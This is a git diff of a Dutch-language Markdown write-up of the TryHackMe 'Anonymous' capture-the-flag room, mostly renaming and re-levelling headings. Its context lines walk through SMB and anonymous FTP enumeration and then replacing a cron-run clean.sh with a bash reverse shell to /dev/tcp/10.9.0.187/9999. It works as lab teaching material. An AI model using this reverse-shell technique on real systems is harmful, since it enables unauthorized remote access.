@@ -6,9 +6,11 @@ subject: "Markdown"
 keywords: [Markdown, Example]
 ---
 
-# Enumeration
+# TryHackMe - Anonymous
 
-## nmap
+## Enumeration
+
+### nmap
 
 Zoals gewoonlijk, starten we bij het zoeken openstaande poorten op de target.
 
@@ -35,7 +37,7 @@ De server draait samba-shares voor op het netwerk (139 / 445), aanvaard ook FTP-
 
 
 
-## SMB
+### SMB
 
 Eerst de service enumeraten voor te zien welke shares er precies zijn
 
@@ -72,7 +74,7 @@ smb: \>
 Een beetje vreemd om voor slechts 2 foto's een share aan te maken. De foto's hadden ook geen bestanden verborgen in de afbeeldingen zelf. 
 
 
-## FTP
+### FTP
 
 De server bleek ook FTP-verbindingen te aanvaarden, eens kijken of dit ook anonieme-logins toelaat:
 
@@ -131,7 +133,7 @@ local: to_do.txt remote: to_do.txt
 ftp> 
 ```
 
-## File Inspection
+### File Inspection
 
 Ik dacht te beginnen bij het to_do-lijstje:
 
@@ -176,9 +178,9 @@ Ik vermoed dat er cronjob op het systeem aanwezig is die het uitvoeren van dit s
 Dat betekent dat we een reverse-shell script kunnen verbergen in het clean.sh script, dat bij het uitvoeren ons een shell geeft.
 
 
-# Getting a shell
+## Getting a shell
 
-## Writing the script
+### Writing the script
 
 Het script dat ik zal gebruiken om ons een shell te geven met het systeem ziet er uit als volgt:
 
@@ -190,7 +192,7 @@ Het script dat ik zal gebruiken om ons een shell te geven met het systeem ziet e
 bash -i >& /dev/tcp/10.9.0.187/9999 0>&1
 ```
 
-## Uploading malicious script
+### Uploading malicious script
 
 Nu verbinden we weer met FTP om onze clean.sh up te loaden naar de server:
 
@@ -224,9 +226,9 @@ bash: no job control in this shell
 namelessone@anonymous:~$ 
 ```
 
-# Privelege Escelation
+## Privelege Escelation
 
-## user flas
+### user-flag
 
 
 Nu even de user.txt zien te locaten:
@@ -261,7 +263,7 @@ cat /home/namelessone/user.txt
 [REDACTED]
 ```
 
-## Root-flag
+### Root-flag
 
 Het de meest gebruikte techniek om jezelf root permissies te geven, is door de GTFOBins die dit mogelijk maken. Deze techniek pas ik dan zelf ook toe.
 
